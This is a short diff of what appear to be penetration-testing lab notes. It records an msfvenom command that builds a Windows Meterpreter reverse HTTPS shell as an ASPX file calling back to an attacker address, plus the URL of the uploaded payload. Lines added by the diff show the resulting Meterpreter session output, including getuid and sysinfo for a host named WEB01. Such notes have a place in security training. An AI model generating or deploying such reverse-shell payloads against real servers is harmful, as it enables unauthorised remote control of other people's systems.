@@ -21,6 +21,16 @@ http://192.168.159.132/upload/met.aspx
 Create reverse shell payload using msfvenom:
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f aspx -o /home/kali/met.aspx
 
+getuid
+Server username: IIS APPPOOL\DefaultAppPool
+meterpreter > sysinfo
+Computer        : WEB01
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : EVIL
+Logged On Users : 8
+Meterpreter     : x64/windows
 
 
 
